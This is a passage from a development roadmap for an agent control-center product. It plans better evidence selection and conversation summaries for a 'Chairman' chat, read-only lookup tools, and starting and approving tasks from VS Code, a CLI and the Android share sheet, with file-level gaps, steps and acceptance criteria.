Chairman chat picks its evidence from the question: 'why are tests failing' gets the failing test output, 'what changed' gets the changed files, 'did it do X' gets the work report. Long chats keep a running summary instead of forgetting everything before the last 12 messages. Ask and chat gain read-only lookups for recovery strategy results, recurring failures, per-agent stage history and a task's final report. The operator can then ask 'what works in this repository' and get recorded facts. Ask from the phone comes last, answered on the node, masked, never stored in the cloud, and only after the operator turns it on at the PC.

**Verified gap:** forChat always builds the same four sections, whatever the question: failure, verification, review and last_strategy (chairman/evidence.ts:173-184). Chat history is listMessages(limit 12) (chairman/chat.ts:157-160). conversationSummary is only mapped (chairman/store.ts:39, :71, :241) and never written. Reasoner.run launches the agent without a toolBridge (chairman/reasoner.ts:325-360). CONTROL_CENTER_CAPABILITIES lists five read ops: tasks, task, usage, approvals, learning (tools/control-center.ts:140). The /ask route is registered only in local mode (apps/dashboard/src/app/App.tsx:100).

**First steps**

1. chairman/evidence.ts: forChat(task, question) routes deterministically, in the style of intent.ts: tests goes to testFailure of the latest failed tests stage, files/diff to changed_files, report/did-it to work_report, tool/install to tool_executions plus tool_recovery, plan to plan. It also includes the last 3 strategies, within the unchanged budget. chat.ts passes message.body. Add a unit test for each route.
2. chairman/chat.ts: once there are more than 12 messages, fold the older decision, action and directive messages deterministically into chairman_sessions.conversation_summary via updateSession. reasoner.chatPrompt then emits a fenced 'CONVERSATION SUMMARY' block before RECENT CONVERSATION.
3. tools/control-center.ts: add read-only controlcenter.report, controlcenter.failures (signature recurrences plus flaky and pre-existing test ids from test_runs), controlcenter.strategies (a cross-task aggregate of chairman_strategy_runs) and controlcenter.stage_history, and list them in CONTROL_CENTER_CAPABILITIES. Tests prove each is readOnly and reachable from an Ask session.

**Done when:** On a task with a failed tests stage, asking the chat 'why are the tests failing?' gets an answer that names the failing test ids from the log tail. In a 30-message chat, a decision made in message 3 still shows in the prompt's CONVERSATION SUMMARY. Ask answers 'which recovery strategies worked in &lt;repo>' and 'show TASK-12's report' with Sources listing the new controlcenter.* lookups, and Tools activity can filter by origin chairman or ask. With 'Allow Ask from the cloud' off, the cloud ask.* ops are refused. With it on, a phone question is answered by the node with personal data masked, and no Ask content appears in D1.

**Check before building:** The Chairman agent (Claude Code or Codex CLI, whichever is configured) must load the acc MCP bridge in non-interactive mode and finish lookups within 240 s. Ask shows this works, but it needs a latency check. For remote Ask: confirm the cloud relay (Durable Object/WebSocket) handles a large final ask.message and a 202 plus realtime completion pattern within its message-size and command-wait limits.

### UX-5 · Start and approve tasks from VS Code, a terminal and the phone share sheet

**Later** · Effort L · Impact 3/5 · Needs: nothing first

In VS Code the operator can right-click a selection or use a quick fix on a problem to open New Task already filled in: the right repository, the file and line range, and the fenced code. Routine approval toasts get an 'Approve' button, while typed and Level 5 approvals still open the full review. On Android, sharing a link or text into the installed app opens New Task prefilled, and nothing is created until the operator presses Create. A small `acc` command then lets scripts create and follow tasks with a revocable, narrowly scoped token instead of the full-power local token.

**Verified gap:** apps/vscode-extension/package.json declares commands only (lines 31-111) and has no contributes.menus. acc.newTask opens an empty '/tasks/new' (extension.ts:287). The navigate message carries only a path (extension.ts:169; apps/dashboard/src/webview-main.tsx:44-53). The approval toast offers only 'Review Approval' (extension.ts:121). CONNECTED_APP_KINDS = ['private-browser'] (packages/shared/src/tools.ts:386). manifest.webmanifest has no share_target. apps/orchestrator/build.mjs bundles only dist/main.js and dist/acc-mcp.js.

**First steps**

1. apps/vscode-extension: add acc.newTaskFromSelection (editor/context menu) and a CodeActionProvider for 'New task from this problem'. Each resolves the file's folder through registeredRoot to a repositoryId, builds a description with the relative path, the line range and the fenced selection or diagnostic (capped at 4 KB), and calls openPanel(route, state). The navigate message carries the state, and HostNavigation in webview-main.tsx passes it to navigate(). An unregistered folder gets an explanatory message.
2. The approval notification in extension.ts adds 'Approve' only when the pending approval has confirmationPhrase null and risk ≠ 'dangerous'. It POSTs /api/approvals/:id/approve with the note 'from VS Code'; the other cases keep 'Review Approval'. Add extension unit tests.
3. Add share_target {action '/tasks/new', method GET, params title/text/url} to apps/dashboard/public/manifest.webmanifest. NewTaskPage maps those search params into the existing handover and prefills only; cover it in e2e/pwa.spec.ts. The CLI follows as its own PR: kind 'cli', a per-kind intake schema, a path-resolve route, dist/acc.js in build.mjs, a 'Pair CLI' button in ConnectedAppsTab, and an update to docs/systems/connected-apps.md.

**Done when:** 'New Task from Selection' on lines in a registered repository opens New Task with that repository chosen and a description holding path:line-range and the fenced selection; in an unregistered folder it opens nothing and says why. A Level 3 command approval toast shows Approve, and pressing it resumes the task, while Level 5 and dangerous approvals show only Review. Sharing a URL from Android Chrome into the installed PWA opens New Task prefilled, and no task exists until Create is pressed. Later PR: `acc task "…" --repo . --wait` creates a Discuss First task using only the app token, exits non-zero when the task fails, and is refused after the app is revoked. The e2e matrix passes in both themes.

**Check before building:** VS Code does not appear to offer a public Problems-view context-menu contribution point; confirm this. Otherwise use a CodeActionProvider quick fix ('Create Control Center task for this problem') or testing/item/context. Web Share Target works in Chrome on Android for an installed PWA but not in iOS/iPadOS Safari; check desktop support. Confirm that Cloudflare Access keeps the query string across its login redirect for the GET share action.
